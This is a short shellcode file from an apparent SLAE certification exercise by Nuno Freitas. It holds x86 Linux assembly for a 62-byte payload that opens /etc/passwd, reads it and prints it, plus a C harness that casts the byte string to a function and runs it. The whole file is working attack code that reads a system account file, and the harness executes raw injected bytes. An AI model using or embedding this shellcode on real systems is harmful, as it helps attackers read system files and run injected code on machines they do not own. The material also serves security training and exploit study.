/*
; Title     : Linux/x86 - Read /etc/passwd Shellcode (62 bytes)
; Date      : May, 2018
; Author    : Nuno Freitas
; Blog Post : https://bufferoverflowed.wordpress.com/slae32/slae-32-polymorphing-shellcodes/
; Twitter   : @nunof11
; SLAE ID   : SLAE-1112
; Size      : 62 bytes
; Tested on : i686 GNU/Linux

section .text

global _start

_start:
	xor eax, eax
	jmp two

one:
	pop ebx
	mov al, 0x5
	int 0x80
	mov esi, eax
	jmp read

exit:
	mov al, 0x1
	xor ebx, ebx
	int 0x80

read:
	mov ebx, esi
	mov al, 0x3
	mov ecx, esp
	mov dl, 0x01
	int 0x80

	xor ebx, ebx
	cmp eax, ebx
	je exit

	mov al, 0x4
	mov bl, 0x1
	int 0x80

	inc esp
	jmp read

two:
	call one
	string: db "/etc/passwd"
*/

#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \
"\x31\xc9\xf7\xe1\xeb\x28\x5b\xb0\x05\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x89\xe1\xb2\x01\xcd\x80\x31\xdb\x39\xd8\x74\xea\xb0\x04\xb3\x01\xcd\x80\x44\xeb\xe7\xe8\xd3\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64";

void main()
{
	printf("Shellcode Length:  %d\n", strlen(shellcode));

	int (*ret)() = (int(*)())shellcode;
	ret();
}